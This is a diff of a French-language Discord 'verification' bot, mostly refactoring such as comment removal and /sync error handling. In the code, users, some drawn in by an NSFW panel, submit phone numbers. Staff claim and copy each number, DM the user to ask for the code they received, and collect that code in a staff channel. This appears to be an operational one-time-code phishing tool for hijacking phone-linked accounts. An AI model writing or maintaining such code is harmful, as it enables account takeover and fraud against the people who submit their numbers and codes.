@@ -8,7 +8,19 @@ import logging
 from typing import Optional, Dict
 from aiohttp import web
 import config
-from utils import validate_phone, mask_phone, validate_code, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist, remove_user_blacklist, load_setup_data, save_setup_data
+from utils import (
+    validate_phone,
+    mask_phone,
+    validate_code,
+    load_blacklist,
+    save_blacklist,
+    is_user_blacklisted,
+    is_phone_blacklisted,
+    add_to_blacklist,
+    remove_user_blacklist,
+    load_setup_data,
+    save_setup_data,
+)
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("VerifBot")
@@ -19,6 +31,7 @@ intents.members = True
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
+
 cooldowns: Dict[int, float] = {}
 pending_verifications: Dict[int, dict] = {}
 staff_active_claims: Dict[int, dict] = {}
@@ -26,16 +39,16 @@ retry_cooldowns: Dict[int, float] = {}
 blacklist = load_blacklist()
 
 # Couleurs
-SETUP_COLOR = 0x5865f2          # Bleu Discord (setup normal)
-SETUP_NSFW_COLOR = 0xff6a00     # Orange vif (setup NSFW)
+SETUP_COLOR = 0x5865f2
+SETUP_NSFW_COLOR = 0xff6a00
 COLOR_SUCCESS = 0x57f287
 COLOR_WARNING = 0xfee75c
 COLOR_DANGER = 0xed4245
 
-# ===== HEALTH SERVER =====
 
 async def health_handler(request):
     return web.Response(text="OK", status=200)
+
 
 async def start_health_server():
     app = web.Application()
@@ -47,7 +60,6 @@ async def start_health_server():
     await site.start()
     log.info(f"Health check server on port {config.PORT}")
 
-# ===== BAN / UNBAN =====
 
 async def ban_user(user_id: int, reason: str = ""):
     guild = bot.get_guild(config.GUILD_ID)
@@ -64,10 +76,8 @@ async def ban_user(user_id: int, reason: str = ""):
     except:
         return False
 
-# ===== STAFF CLAIM VIEW (copier numéro) =====
 
 class StaffClaimView(discord.ui.View):
-    """View attachée au message éphémère quand un staff claim un numéro."""
     def __init__(self, phone: str, user_id: int, parent_view: "StaffPanelView"):
         super().__init__(timeout=None)
         self.phone = phone
@@ -76,7 +86,6 @@ class StaffClaimView(discord.ui.View):
 
     @discord.ui.button(label="📋 Copier le numéro", style=discord.ButtonStyle.secondary, custom_id="copy_phone_btn")
     async def copy_phone(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # Envoie le numéro en texte brut pour que l'utilisateur puisse le copier facilement
         await interaction.response.send_message(
             f"📱 **Numéro :** `{self.phone}`",
             ephemeral=True
@@ -89,14 +98,13 @@ class StaffClaimView(discord.ui.View):
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
         if self.parent_view.claimed_by and self.parent_view.claimed_by != interaction.user.id:
-            embed = discord.Embed(title="Action impossible", description=f"Seul le staff qui a pris en charge peut fermer.", color=COLOR_DANGER)
+            embed = discord.Embed(title="Action impossible", description="Seul le staff qui a pris en charge peut fermer.", color=COLOR_DANGER)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
         await self.parent_view.close_ticket("Fermé - Banni", do_ban=True, reason="Banni via fermeture depuis le panneau staff")
         embed = discord.Embed(title="Vérification fermée", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-# ===== PROOF BAN MODAL =====
 
 class ProofBanModal(discord.ui.Modal, title="Bannir un utilisateur"):
     user_id_input = discord.ui.TextInput(
@@ -131,7 +139,6 @@ class ProofBanModal(discord.ui.Modal, title="Bannir un utilisateur"):
         )
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-# ===== PROOF VIEW =====
 
 class ProofView(discord.ui.View):
     def __init__(self):
@@ -146,7 +153,6 @@ class ProofView(discord.ui.View):
     async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(ProofBanModal())
 
-# ===== VALIDATION CHANNEL VIEW =====
 
 class ValidationChannelView(discord.ui.View):
     def __init__(self, user_id: int, phone: str):
@@ -161,7 +167,7 @@ class ValidationChannelView(discord.ui.View):
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
         add_to_blacklist(self.user_id, self.phone, blacklist)
-        banned = await ban_user(self.user_id, "Scam confirmé via validation")
+        await ban_user(self.user_id, "Scam confirmé via validation")
         for child in self.children:
             if isinstance(child, discord.ui.Button):
                 child.disabled = True
@@ -176,7 +182,7 @@ class ValidationChannelView(discord.ui.View):
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
         add_to_blacklist(self.user_id, self.phone, blacklist)
-        banned = await ban_user(self.user_id, "Banni via fermeture validation")
+        await ban_user(self.user_id, "Banni via fermeture validation")
         for child in self.children:
             if isinstance(child, discord.ui.Button):
                 child.disabled = True
@@ -184,7 +190,6 @@ class ValidationChannelView(discord.ui.View):
         await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
         await interaction.followup.send(embed=embed, ephemeral=True)
 
-# ===== PHONE MODAL =====
 
 class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
     phone = discord.ui.TextInput(
@@ -231,7 +236,6 @@ class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
         await interaction.response.send_message(embed=embed_wait, ephemeral=True)
         await send_staff_panel(interaction.user, phone_raw)
 
-# ===== BUILD STAFF EMBED =====
 
 def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_requested: bool = False, timestamp: Optional[datetime.datetime] = None):
     if timestamp is None:
@@ -247,7 +251,6 @@ def build_staff_embed(user: discord.User, phone: str, status: str = "En attente"
     embed.set_footer(text=datetime.datetime.now().strftime("%d/%m/%Y %H:%M") + " • Vérification")
     return embed
 
-# ===== STAFF PANEL VIEW =====
 
 class StaffPanelView(discord.ui.View):
     def __init__(self, user_id: int, phone: str):
@@ -273,7 +276,6 @@ class StaffPanelView(discord.ui.View):
         if self.auto_close_task:
             self.auto_close_task.cancel()
             self.auto_close_task = None
-        # Désactiver les boutons du panneau principal
         for child in self.children:
             if isinstance(child, discord.ui.Button):
                 child.disabled = True
@@ -315,7 +317,6 @@ class StaffPanelView(discord.ui.View):
         staff_active_claims[staff_id] = {"view": self, "user_id": self.user_id}
         self.claimed_by = staff_id
 
-        # Message éphémère avec le numéro + bouton copier
         embed_reveal = discord.Embed(
             title="🔓 Numéro débloqué",
             description=f"```\n{self.phone}\n```\n*Cliquez sur « 📋 Copier » pour copier facilement.*",
@@ -326,7 +327,6 @@ class StaffPanelView(discord.ui.View):
         self.claim_view = StaffClaimView(self.phone, self.user_id, self)
         await interaction.response.send_message(embed=embed_reveal, view=self.claim_view, ephemeral=True)
 
-        # Mettre à jour le panneau staff principal
         user_fetch = await bot.fetch_user(self.user_id)
         new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="En cours", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
@@ -367,7 +367,6 @@ class StaffPanelView(discord.ui.View):
         )
         await interaction.response.send_message(embed=embed_confirm, ephemeral=True)
 
-        # Log dans le salon de logs
         log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
         if log_channel:
             embed_log = discord.Embed(
@@ -383,7 +382,6 @@ class StaffPanelView(discord.ui.View):
             embed_log.set_footer(text="Logs de vérification")
             await log_channel.send(embed=embed_log)
 
-        # Envoyer le DM à l'utilisateur
         try:
             user = await bot.fetch_user(self.user_id)
             embed_dm = discord.Embed(
@@ -406,7 +404,6 @@ class StaffPanelView(discord.ui.View):
             self.code_requested = False
             return
 
-        # Mettre à jour l'embed du panneau staff
         user_fetch = await bot.fetch_user(self.user_id)
         new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code demandé - en attente", claimed_by=self.claimed_by, code_requested=True, timestamp=interaction.message.created_at)
         new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
@@ -444,7 +441,6 @@ class StaffPanelView(discord.ui.View):
         embed = discord.Embed(title="Vérification fermée", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-# ===== ENVOYER PANEL STAFF =====
 
 async def send_staff_panel(user: discord.User, phone: str):
     guild = bot.get_guild(config.STAFF_GUILD_ID)
@@ -461,7 +457,6 @@ async def send_staff_panel(user: discord.User, phone: str):
     msg = await channel.send(content="@everyone", embed=embed, view=view)
     view.message = msg
 
-# ===== VALIDATION CHANNEL =====
 
 async def send_validation_channel_message(user: discord.User, phone: str, code: str, claimed_by: int):
     validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
@@ -480,7 +475,6 @@ async def send_validation_channel_message(user: discord.User, phone: str, code: 
     view = ValidationChannelView(user.id, phone)
     await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val, view=view)
 
-# ===== GESTION DM CODE =====
 
 async def handle_dm_code(message: discord.Message):
     user_id = message.author.id
@@ -527,7 +521,6 @@ async def handle_dm_code(message: discord.Message):
     await message.channel.send(embed=embed_success)
     await send_validation_channel_message(message.author, phone, content, claimed_by)
 
-    # Log
     log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
     if log_channel:
         embed_log = discord.Embed(
@@ -545,7 +538,6 @@ async def handle_dm_code(message: discord.Message):
         embed_log.set_footer(text="Logs de vérification")
         await log_channel.send(embed=embed_log)
 
-    # Ajouter le rôle vérifié
     if config.VERIFIED_ROLE_ID and config.GUILD_ID:
         guild = bot.get_guild(config.GUILD_ID)
         if guild:
@@ -558,7 +550,6 @@ async def handle_dm_code(message: discord.Message):
                     except discord.Forbidden:
                         log.warning(f"Permission manquante rôle {user_id}")
 
-    # Mettre à jour le panneau staff (désactiver)
     user_fetch = await bot.fetch_user(user_id)
     staff_guild = bot.get_guild(config.STAFF_GUILD_ID)
     if staff_guild:
@@ -583,14 +574,14 @@ async def handle_dm_code(message: discord.Message):
                                     pass
                                 break
 
-# ===== BOUTON VÉRIFIER (global, persistant) =====
 
 class VerifyButton(discord.ui.Button):
     def __init__(self):
-        super().__init__(label="🔞 Vérifier" if False else "✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
+        super().__init__(label="✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
 
     async def callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(PhoneModal())
+
 
 class VerifyButtonView(discord.ui.View):
     def __init__(self, is_nsfw: bool = False):
@@ -664,7 +655,6 @@ async def setupnsfw(interaction: discord.Interaction):
 
     view = VerifyButtonView(is_nsfw=True)
 
-    # Vérifier s'il y a déjà un setup dans ce salon → update
     setup_data = load_setup_data()
     existing = None
     for entry in setup_data:
@@ -680,12 +670,11 @@ async def setupnsfw(interaction: discord.Interaction):
             await interaction.response.send_message(embed=embed_success, ephemeral=True)
             return
         except (discord.NotFound, discord.HTTPException):
-            pass  # Message supprimé, on en crée un nouveau
+            pass
 
     await interaction.response.send_message(embed=embed, view=view)
     msg = await interaction.original_response()
 
-    # Sauvegarder dans setup_data
     if existing:
         existing["message_id"] = msg.id
         existing["type"] = "nsfw"
@@ -699,8 +688,6 @@ async def setupnsfw(interaction: discord.Interaction):
     log.info(f"Setup NSFW fait dans #{interaction.channel.name} (msg: {msg.id})")
 
 
-# ===== AUTRES COMMANDES =====
-
 @bot.tree.command(name="proofsetup", description="Crée le panneau de preuves dans ce salon")
 @app_commands.default_permissions(administrator=True)
 async def proofsetup(interaction: discord.Interaction):
@@ -713,6 +700,7 @@ async def proofsetup(interaction: discord.Interaction):
     view = ProofView()
     await interaction.response.send_message(embed=embed, view=view)
     log.info(f"Proof setup fait dans #{interaction.channel.name}")
+
 
 @bot.tree.command(name="retry", description="Relancer la vérification si vous n'avez pas reçu le code")
 async def retry(interaction: discord.Interaction):
@@ -747,6 +735,7 @@ async def retry(interaction: discord.Interaction):
     phone = "Numéro inconnu"
     await send_staff_panel(user, phone)
 
+
 @bot.tree.command(name="clear", description="Supprime un nombre de messages dans le salon")
 @app_commands.default_permissions(administrator=True)
 @app_commands.describe(nombre="Nombre de messages à supprimer")
@@ -760,11 +749,13 @@ async def clear(interaction: discord.Interaction, nombre: int):
     embed = discord.Embed(title="Salon nettoyé", description=f"{len(deleted)} messages supprimés.", color=COLOR_SUCCESS)
     await interaction.followup.send(embed=embed, ephemeral=True)
 
+
 @bot.tree.command(name="ping", description="Affiche la latence du bot")
 async def ping(interaction: discord.Interaction):
     latency = round(bot.latency * 1000)
     embed = discord.Embed(title="Pong", description=f"Latence : {latency}ms", color=COLOR_SUCCESS)
     await interaction.response.send_message(embed=embed, ephemeral=True)
+
 
 @bot.tree.command(name="ban", description="Ban un utilisateur silencieusement par ID")
 @app_commands.default_permissions(administrator=True)
@@ -784,6 +775,7 @@ async def ban(interaction: discord.Interaction, user_id: str):
     )
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
+
 @bot.tree.command(name="unban", description="Déban un utilisateur par ID et nettoie toutes ses données")
 @app_commands.default_permissions(administrator=True)
 @app_commands.describe(user_id="ID de l'utilisateur à débannir")
@@ -796,10 +788,8 @@ async def unban(interaction: discord.Interaction, user_id: str):
         return
 
     guild = bot.get_guild(config.GUILD_ID)
-    status_text = ""
     cleared_items = []
 
-    # 1. Tentative de déban Discord
     if guild:
         try:
             await guild.unban(discord.Object(id=target_id), reason="Débanni via commande /unban")
@@ -809,26 +799,21 @@ async def unban(interaction: discord.Interaction, user_id: str):
         except Exception as e:
             cleared_items.append(f"Erreur ban Discord : {str(e)}")
 
-    # 2. Retirer de la blacklist
     remove_user_blacklist(target_id, blacklist)
     cleared_items.append("Blacklist retirée")
 
-    # 3. Nettoyer les vérifications en attente
     if target_id in pending_verifications:
         pending_verifications.pop(target_id, None)
         cleared_items.append("Vérification en attente nettoyée")
 
-    # 4. Nettoyer le cooldown
     if target_id in cooldowns:
         cooldowns.pop(target_id, None)
         cleared_items.append("Cooldown réinitialisé")
 
-    # 5. Nettoyer le retry cooldown
     if target_id in retry_cooldowns:
         retry_cooldowns.pop(target_id, None)
         cleared_items.append("Retry cooldown réinitialisé")
 
-    # 6. Forcer la fermeture du ticket staff si ouvert
     for sid, sdata in list(staff_active_claims.items()):
         if sdata.get("user_id") == target_id:
             try:
@@ -845,6 +830,7 @@ async def unban(interaction: discord.Interaction, user_id: str):
     )
     await interaction.response.send_message(embed=embed, ephemeral=True)
     log.info(f"Unban complet pour {target_id} : {', '.join(cleared_items)}")
+
 
 @bot.tree.command(name="banlist", description="Affiche la liste des utilisateurs blacklist")
 @app_commands.default_permissions(administrator=True)
@@ -863,31 +849,33 @@ async def banlist(interaction: discord.Interaction):
     embed.set_footer(text=f"Total : {len(users)} users • {len(phones)} numéros")
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
+
 @bot.tree.command(name="sync", description="Sync les commandes slash")
 @app_commands.default_permissions(administrator=True)
 async def sync(interaction: discord.Interaction):
-    await bot.tree.sync()
-    embed = discord.Embed(title="Commandes synchronisées", color=COLOR_SUCCESS)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-# ===== EVENTS =====
-
+    await interaction.response.defer(ephemeral=True)
+    try:
+        synced = await bot.tree.sync()
+        embed = discord.Embed(
+            title="Commandes synchronisées",
+            description=f"{len(synced)} commande(s) synchronisée(s).",
+            color=COLOR_SUCCESS,
+        )
+        await interaction.followup.send(embed=embed, ephemeral=True)
+    except Exception as error:
+        log.exception("Erreur pendant la synchronisation des commandes")
+        embed = discord.Embed(
+            title="Erreur de synchronisation",
+            description=f"```{error}```",
+            color=COLOR_DANGER
+        )
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
 
 @bot.event
 async def on_ready():
     log.info(f"Connecté : {bot.user}")
-
-    try:
-        await bot.load_extension("announcement")
-        log.info("Extension announcement chargée.")
-    except Exception as e:
-        log.exception("Erreur lors du chargement de l'extension announcement: %s", e)
-
-    await bot.tree.sync()
-    log.info("Commandes slash synchronisées.")
-
-    # Restaurer les vues persistantes pour les messages de setup
+    asyncio.create_task(start_health_server())
     setup_data = load_setup_data()
     restored_count = 0
     entries_to_remove = []
@@ -896,13 +884,11 @@ async def on_ready():
         channel_id = entry.get("channel_id")
         message_id = entry.get("message_id")
         if not message_id:
-            # Ancienne entrée sans message_id → on essaie de la trouver dans l'historique
             channel = bot.get_channel(channel_id)
             if channel:
                 try:
                     async for msg in channel.history(limit=50):
                         if msg.author == bot.user and msg.embeds:
-                            # Vérifier quel type de setup
                             is_nsfw = entry.get("type") == "nsfw"
                             view = VerifyButtonView(is_nsfw=is_nsfw)
                             bot.add_view(view, message_id=msg.id)
@@ -920,7 +906,6 @@ async def on_ready():
             if not channel:
                 entries_to_remove.append(entry)
                 continue
-            # Vérifier que le message existe toujours
             msg = await channel.fetch_message(message_id)
             is_nsfw = entry.get("type") == "nsfw"
             view = VerifyButtonView(is_nsfw=is_nsfw)
@@ -928,11 +913,9 @@ async def on_ready():
             restored_count += 1
             log.info(f"Vue persistante restaurée dans #{channel.name} (msg: {message_id})")
         except (discord.NotFound, discord.HTTPException):
-            # Message supprimé → retirer l'entrée
             entries_to_remove.append(entry)
             log.warning(f"Message de setup {message_id} introuvable, entrée retirée.")
 
-    # Nettoyer les entrées orphelines
     if entries_to_remove:
         for entry in entries_to_remove:
             if entry in setup_data:
@@ -941,7 +924,7 @@ async def on_ready():
         log.info(f"{len(entries_to_remove)} entrées de setup nettoyées.")
 
     log.info(f"{restored_count} vues persistantes restaurées au total.")
-    asyncio.create_task(start_health_server())
+
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -950,10 +933,10 @@ async def on_message(message: discord.Message):
     if isinstance(message.channel, discord.DMChannel):
         await handle_dm_code(message)
 
-# ===== LANCEMENT =====
 
 if __name__ == "__main__":
     if not config.BOT_TOKEN:
         log.critical("BOT_TOKEN manquant dans .env")
         exit(1)
+
     bot.run(config.BOT_TOKEN)
